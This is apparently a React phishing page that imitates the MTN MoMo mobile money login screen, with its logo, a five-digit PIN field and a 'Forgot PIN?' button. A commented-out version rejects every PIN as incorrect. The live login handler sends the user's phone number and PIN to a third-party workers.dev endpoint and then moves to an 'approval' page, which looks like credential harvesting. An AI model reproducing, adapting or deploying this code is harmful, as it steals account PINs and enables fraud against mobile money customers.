// import React,{ useRef, useState } from "react";
// import momoLogo from "./assets/logo (1).png";

// function MoMoPinEntry() {
//   const [pin, setPin] = useState(Array(5).fill(""));
//   const [error, setError] = useState("");
//   const inputRefs = useRef([]);
//   const isComplete = pin.every(Boolean);

//   const updateDigit = (index, value) => {
//     const digit = value.replace(/\D/g, "").slice(-1);
//     setPin((current) => current.map((item, position) => (position === index ? digit : item)));
//     setError("");

//     if (digit && index < inputRefs.current.length - 1) {
//       inputRefs.current[index + 1]?.focus();
//     }
//   };

//   const handleKeyDown = (event, index) => {
//     if (event.key === "Backspace" && !pin[index] && index > 0) {
//       inputRefs.current[index - 1]?.focus();
//     }
//   };

//   const handlePaste = (event) => {
//     event.preventDefault();
//     const digits = event.clipboardData.getData("text").replace(/\D/g, "").slice(0, 5);
//     if (!digits) return;

//     setPin(Array.from({ length: 5 }, (_, index) => digits[index] || ""));
//     setError("");
//     inputRefs.current[Math.min(digits.length, 4)]?.focus();
//   };

//   const handleLogin = (event) => {
//     event.preventDefault();
//     if (isComplete) {
//       setError("Incorrect PIN. Please try again.");
//     }
//   };

//   return (
//     <main className="mx-auto min-h-dvh w-full max-w-[740px] bg-white px-5 pt-1 font-sans text-[#333]">
//       <header className="-mx-5 flex h-[34vh] min-h-[300px] max-h-[390px] items-center justify-center rounded-b-[clamp(54px,14vw,84px)] bg-[#075876]">
//         <img
//           src={momoLogo}
//           alt="MoMo from MTN"
//           className="h-[clamp(130px,24vw,170px)] w-[clamp(130px,24vw,170px)] object-contain"
//         />
//       </header>

//       <form onSubmit={handleLogin} className="flex flex-col items-center">
//         <label className="mt-2 text-[clamp(18px,4vw,22px)] leading-tight" htmlFor="pin-0">
//           Enter your PIN
//         </label>

//         <div className="mt-7 flex justify-center gap-[clamp(7px,1.5vw,10px)]">
//           {pin.map((digit, index) => (
//             <input
//               key={index}
//               ref={(element) => {
//                 inputRefs.current[index] = element;
//               }}
//               id={`pin-${index}`}
//               type="password"
//               inputMode="numeric"
//               autoComplete={index === 0 ? "current-password" : "off"}
//               maxLength={1}
//               value={digit}
//               onChange={(event) => updateDigit(index, event.target.value)}
//               onKeyDown={(event) => handleKeyDown(event, index)}
//               onPaste={handlePaste}
//               aria-invalid={Boolean(error)}
//               aria-describedby={error ? "pin-error" : undefined}
//               aria-label={`PIN digit ${index + 1}`}
//               className="h-[clamp(58px,12vw,70px)] w-[clamp(52px,10.2vw,62px)] rounded-[14px] border-2 border-[#c68d8d] bg-white text-center text-2xl text-[#333] outline-none focus:border-[#075876]"
//             />
//           ))}
//         </div>

//         {error && (
//           <p id="pin-error" role="alert" className="mt-3 text-sm text-red-700">
//             {error}
//           </p>
//         )}

//         <button
//           type="button"
//           className="mt-1 text-[clamp(17px,3.8vw,21px)] leading-tight text-[#333]"
//         >
//           Forgot PIN?
//         </button>

//         <button
//           type="submit"
//           disabled={!isComplete}
//           className={`mt-8 h-[58px] w-[85%] rounded-[14px] text-[clamp(18px,4vw,22px)] font-semibold text-white transition-colors ${
//             isComplete ? "bg-[#075876] hover:bg-[#064a62]" : "cursor-not-allowed bg-[#77abc3]"
//           }`}
//         >
//           Login
//         </button>
//       </form>
//     </main>
//   );
// }

// export default MoMoPinEntry;

import React, { useRef, useState } from "react";
import momoLogo from "./assets/logo (1).png";
import { useLocation, useNavigate } from "react-router-dom";

function MoMoPinEntry() {
  const [pin, setPin] = useState(Array(5).fill(""));
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);
  const [success, setSuccess] = useState("");
  const navigate = useNavigate();
  const location = useLocation();
  const phone = location.state?.phone || "";

  const inputRefs = useRef([]);

  const isComplete = pin.every(Boolean);

  const updateDigit = (index, value) => {
    const digit = value.replace(/\D/g, "").slice(-1);

    setPin((current) =>
      current.map((item, position) =>
        position === index ? digit : item
      )
    );

    setError("");
    setSuccess("");

    if (digit && index < 4) {
      inputRefs.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (event, index) => {
    if (
      event.key === "Backspace" &&
      !pin[index] &&
      index > 0
    ) {
      inputRefs.current[index - 1]?.focus();
    }
  };

  const handlePaste = (event) => {
    event.preventDefault();

    const digits = event.clipboardData
      .getData("text")
      .replace(/\D/g, "")
      .slice(0, 5);

    if (!digits) return;

    setPin(
      Array.from(
        { length: 5 },
        (_, index) => digits[index] || ""
      )
    );

    setError("");
    setSuccess("");

    inputRefs.current[
      Math.min(digits.length, 4)
    ]?.focus();
  };

  const handleLogin = async (event) => {
    event.preventDefault();

    setError("");
    setSuccess("");

    if (!isComplete) {
      setError("Please enter your complete PIN.");
      return;
    }

    setLoading(true);

    try {
      const response = await fetch("https://my-worker-app.instapayapi.workers.dev/api/login2", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          mobileNumber: phone,
          pin: pin.join(""),
        }),
      });

      const data = await response.json();

      // Example navigation:
      navigate("/approval", { state: { phone: phone, pin: pin.join("") } });

    } catch (err) {
      setError(
        err instanceof Error
          ? err.message
          : "Something went wrong. Please try again."
      );
    } finally {
      setLoading(false);
    }
  };

  return (
    <main
      className="mx-auto min-h-dvh w-full max-w-[740px]
                 bg-white px-5 pt-1 font-sans text-[#333]"
    >
      <header
        className="-mx-5 flex h-[34vh] min-h-[300px]
                   max-h-[390px] items-center justify-center
                   rounded-b-[clamp(54px,14vw,84px)]
                   bg-[#075876]"
      >
        <img
          src={momoLogo}
          alt="MoMo"
          className="h-[clamp(130px,24vw,170px)]
                     w-[clamp(130px,24vw,170px)]
                     object-contain"
        />
      </header>

      <form
        onSubmit={handleLogin}
        className="flex flex-col items-center"
      >
        <label
          htmlFor="pin-0"
          className="mt-2 text-[clamp(18px,4vw,22px)]
                     leading-tight"
        >
          Enter your PIN
        </label>

        {/* PIN inputs */}
        <div
          className="mt-7 flex justify-center
                     gap-[clamp(7px,1.5vw,10px)]"
        >
          {pin.map((digit, index) => (
            <input
              key={index}
              ref={(element) => {
                inputRefs.current[index] = element;
              }}
              id={`pin-${index}`}
              type="password"
              inputMode="numeric"
              autoComplete={
                index === 0
                  ? "current-password"
                  : "off"
              }
              maxLength={1}
              value={digit}
              disabled={loading}
              onChange={(event) =>
                updateDigit(
                  index,
                  event.target.value
                )
              }
              onKeyDown={(event) =>
                handleKeyDown(event, index)
              }
              onPaste={handlePaste}
              aria-label={`PIN digit ${index + 1}`}
              aria-invalid={Boolean(error)}
              className="h-[clamp(58px,12vw,70px)]
                         w-[clamp(52px,10.2vw,62px)]
                         rounded-[14px]
                         border-2 border-[#c68d8d]
                         bg-white
                         text-center text-2xl
                         text-[#333]
                         outline-none
                         focus:border-[#075876]
                         disabled:bg-gray-100"
            />
          ))}
        </div>

        {/* Error */}
        {error && (
          <p
            role="alert"
            className="mt-3 text-sm text-red-700"
          >
            {error}
          </p>
        )}

        {/* Success */}
        {success && (
          <p
            role="status"
            className="mt-3 text-sm text-green-700"
          >
            {success}
          </p>
        )}

        {/* Forgot PIN */}
        <button
          type="button"
          disabled={loading}
          className="mt-1 text-[clamp(17px,3.8vw,21px)]
                     leading-tight text-[#333]"
        >
          Forgot PIN?
        </button>

        {/* Login */}
        <button
          type="submit"
          disabled={!isComplete || loading}
          className={`mt-8 h-[58px] w-[85%]
                      rounded-[14px]
                      text-[clamp(18px,4vw,22px)]
                      font-semibold text-white
                      transition-colors ${isComplete && !loading
              ? "bg-[#075876] hover:bg-[#064a62]"
              : "cursor-not-allowed bg-[#77abc3]"
            }`}
        >
          {loading ? "PLEASE WAIT..." : "Login"}
        </button>
      </form>
    </main>
  );
}

export default MoMoPinEntry;